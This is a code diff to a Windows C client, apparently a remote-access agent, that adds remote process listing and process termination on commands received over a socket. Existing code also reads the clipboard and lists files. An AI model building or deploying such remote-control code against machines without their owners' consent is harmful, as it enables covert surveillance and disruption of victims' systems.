@@ -86,6 +86,7 @@ LPCWSTR GetClipboardText() {
 }
 #include <windows.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 #include "message.h"
 
 #define CHUNK_SIZE 512
@@ -184,10 +185,86 @@ int get_files(char *path, SOCKET ConnectSocket)
     FindClose(hFind);
     return 0;
 }
+int get_processes(char *cmp, SOCKET ConnectSocket)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32 pe32;
 
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        printf("CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
+        return 1;
+    }
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+
+    if (!Process32First(hProcessSnap, &pe32)) {
+        printf("Process32First failed (%lu)\n", GetLastError());
+        CloseHandle(hProcessSnap);
+        return 1;
+    }
+
+    MESSAGE msg;
+    msg.header = GET_PROCESSES;
+
+    do {
+        size_t len = strlen(cmp);
+        msg.header = GET_PROCESSES;
+        msg.hasNext = NEXT_TRUE;
+        memset(msg.payload, 0, 512);
+
+        if(len == 0)
+        {
+            sprintf(msg.payload, "PID: %-6lu  Name: %s\n", pe32.th32ProcessID, pe32.szExeFile);
+            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+        }
+        else if (len <= strlen(pe32.szExeFile))
+        {
+            if(strncmp( pe32.szExeFile, cmp, len) == 0)
+            {
+                sprintf(msg.payload, "PID: %-6lu  Name: %s\n", pe32.th32ProcessID, pe32.szExeFile);
+                send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+            }
+        }
+    } while (Process32Next(hProcessSnap, &pe32));
+    msg.header = GET_PROCESSES;
+    msg.hasNext = NEXT_FALSE;
+    memset(msg.payload, 0, 512);
+    send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+    CloseHandle(hProcessSnap);
+    return 0;
+}
+int kill_process(DWORD pid, SOCKET ConnectSocket)
+{
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    MESSAGE msg;
+    msg.hasNext = NEXT_FALSE;
+    if (hProcess == NULL)
+    {
+
+        sprintf(msg.payload, "Failed to open process. Error: %lu", GetLastError());
+        msg.header = RESPONSE_FAILED;
+        send(ConnectSocket, (char *)&msg, sizeof (MESSAGE), 0);
+        return 1;
+    }
+
+    if (!TerminateProcess(hProcess, 0)) {
+        sprintf(msg.payload, "Failed to terminate process. Error: %lu", GetLastError());
+        msg.header = RESPONSE_FAILED;
+        send(ConnectSocket, (char *)&msg, sizeof (MESSAGE), 0);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    sprintf(msg.payload, "Process %lu terminated successfully.", pid);
+    msg.header = RESPONSE_OK;
+    send(ConnectSocket, (char *)&msg, sizeof (MESSAGE), 0);
+    CloseHandle(hProcess);
+    return 0;
+}
 int main()
 {
-
     int iResult;
 
     iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
@@ -300,10 +377,15 @@ int main()
         }
         if(msg.header == SIGNAL_FILES)
         {
-            printf("%s\n", msg.payload);
             get_files(msg.payload, ConnectSocket);
-
-
+        }
+        if(msg.header == SIGNAL_PROCESSES)
+        {
+            get_processes(msg.payload, ConnectSocket);
+        }
+        if(msg.header == SIGNAL_KILL_PROCESS)
+        {
+            kill_process(*(DWORD*)msg.payload, ConnectSocket);
         }
     }
     closesocket(ConnectSocket);
